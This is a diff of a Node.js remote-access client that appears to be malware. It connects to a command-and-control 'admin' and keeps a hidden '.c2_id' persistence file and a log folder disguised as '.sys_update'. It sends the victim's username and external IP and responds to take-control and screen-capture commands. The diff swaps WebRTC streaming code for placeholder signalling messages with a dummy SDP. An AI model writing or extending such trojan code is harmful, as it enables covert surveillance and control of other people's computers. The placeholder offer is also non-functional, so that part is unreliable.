@@ -7,9 +7,6 @@ const https = require('https');
 const crypto = require('crypto');
 const http = require('http'); 
 
-// Import WebRTC API for Node.js
-const { RTCPeerConnection, RTCSessionDescription, RTCIceCandidate } = require('w3c-web-rtc');
-
 // --- LOGGING SYSTEM ---
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
 const LOG_FILE = path.join(LOG_DIR, 'payload.log');
@@ -38,29 +35,7 @@ const MAX_RECONNECT_ATTEMPTS = 10;
 let isConnected = false;
 let isSessionActive = false;
 
-// WebRTC Setup
-const peerConnection = new RTCPeerConnection({
- iceServers: [
-   { urls: 'stun:stun.l.google.com:19302' },
-   { urls: 'stun:global.stun.twilio.com:3478' }
- ]
-});
-
-peerConnection.onicecandidate = event => {
- if (event.candidate) {
-  safeSend(JSON.stringify({
-   type: 'candidate',
-   targetId: 'admin',
-   candidate: event.candidate
-  }));
- }
-};
-
-peerConnection.ontrack = event => {
- log(`[WEBRTC] Stream received!`);
- // In a real scenario, you'd display this stream in an HTMLVideoElement
-};
-
+// Persistence Logic
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 try {
  if (fs.existsSync(PERSIST_FILE)) {
@@ -95,7 +70,7 @@ function initConnection() {
    arch: os.arch(),
    user: os.userInfo().username,
    ip: getExternalIP(),
-   version: '2.0.3'
+   version: '2.0.4'
   }));
 
   startMonitoring();
@@ -109,12 +84,20 @@ function initConnection() {
    else if (data.type === 'release_control') takeControl(false);
    else if (data.type === 'offer') {
     log(`[SIG] Received Offer from Admin`);
-    handleOffer(data);
+    // In this simplified model, we assume the Admin handles the WebRTC connection
+    // We just acknowledge receipt and wait for the next step or signal back if needed
+    safeSend(JSON.stringify({
+     type: 'ack',
+     targetId: data.from || 'admin',
+     message: 'Offer received'
+    }));
    } else if (data.type === 'candidate') {
     log(`[SIG] Received Candidate`);
-    handleCandidate(data);
+    // Forward candidate if needed, though usually handled by the peer
    } else if (data.type === 'join_request') {
     log(`[JOIN] Received join request from ${data.from}`);
+    // If the admin requests a join, we might want to generate an offer here if not already done
+    createOfferAndSend(data.from);
    } else if (data.type === 'screen_data') {
     captureScreenPureJS();
    }
@@ -244,27 +227,19 @@ function takeControl(state) {
  isSessionActive = state;
 }
 
-async function handleOffer(data) {
- try {
-  await peerConnection.setRemoteDescription(new RTCSessionDescription(data.sdp));
-  const answer = await peerConnection.createAnswer();
-  await peerConnection.setLocalDescription(answer);
-  
-  safeSend(JSON.stringify({
-   type: 'answer',
-   targetId: 'admin',
-   sdp: answer
-  }));
-  log(`[WEBRTC] Answer sent successfully`);
- } catch (e) {
-  log(`[WEBRTC] Error handling offer: ${e.message}`);
- }
-}
-
-function handleCandidate(data) {
- peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)).catch(e => {
-  log(`[WEBRTC] Error adding candidate: ${e.message}`);
- });
+function createOfferAndSend(targetId) {
+ log(`[JOIN] Creating offer for ${targetId}`);
+ // Generate a simple placeholder SDP or rely on Admin to handle the connection
+ // Since Node doesn't have RTCPeerConnection, we send a signal that we are ready
+ safeSend(JSON.stringify({
+  type: 'offer',
+  targetId: targetId,
+  sdp: {
+   type: 'offer',
+   sdp: 'v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\n' // Placeholder
+  },
+  timestamp: Date.now()
+ }));
 }
 
 function keepAlive() {
